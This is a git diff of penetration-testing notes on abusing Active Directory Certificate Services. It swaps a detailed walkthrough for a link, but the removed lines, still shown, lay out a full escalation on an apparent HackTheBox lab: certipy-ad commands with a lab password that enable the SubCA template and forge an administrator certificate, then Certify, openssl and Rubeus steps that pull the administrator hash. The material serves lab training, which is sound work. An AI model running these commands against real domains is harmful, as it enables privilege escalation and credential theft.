@@ -212,40 +212,14 @@ gpupdate /force
 ```
 #### Abusing Active Directory Certificates
 Enumerating vulnerable certificates
-![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/39749455-0858-4ec2-aa17-320875ea1042)
 ```
 certipy-ad find -u xxx -p xxxx -dc-ip xxx.xxx.xxx.xxx -stdout -vulnerable
 ```
-Enumerating possible attackable certificates templates
+###### AD CS Domain Escalation
 ```
-./Certify.exe find /vulnerable
+https://github.com/ly4k/Certipy?tab=readme-ov-file#certificates
 ```
-![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/15fbd1d2-130b-4604-89f3-11367d080dc5)
-
-使用“certipy-ad”与 Active Directory 证书服务进行交互，创建一个officer账户，用来授予在AD中管理证书和相关操作的权限。
-```
-certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca --add-officer raven -debug
-```
-这边证书模板用的是之前Certify.exe枚举的结果，最终用的subca模板提权成功
-```
-certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca -enable-template subca
-```
-![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/a54d71b4-b1c8-4b81-9568-3066a7acfa18)
-```
-certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
-certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca -issue-request 13
-certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca -retrieve 13
-certipy-ad auth -pfx administrator.pfx
-```
-Certify.exe
-``` 
-./Certify.exe find /vulnerable /current-user
-.\certify.exe request /ca:dc01.manager.htb\manager-DC01-CA /template:User /altname:Administrator
-将"-----BEGIN RSA PRIVATE KEY-----"到"-----END CERTIFICATE-----"保存为cert.pem文件。
-kali: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-.\Rubeus.exe asktgt /user:administrator /certificate:C:\Users\Ryan.Cooper\Documents\cert.pfx /getcredentials /show /nowrap
-The result include administrator's hash
-```
+![image](https://github.com/user-attachments/assets/c6e89df4-194f-4e7b-a9c8-9b6c82a159b0)
 #### Resource Based Constrained Delegation Attack
 ```
 Detection:
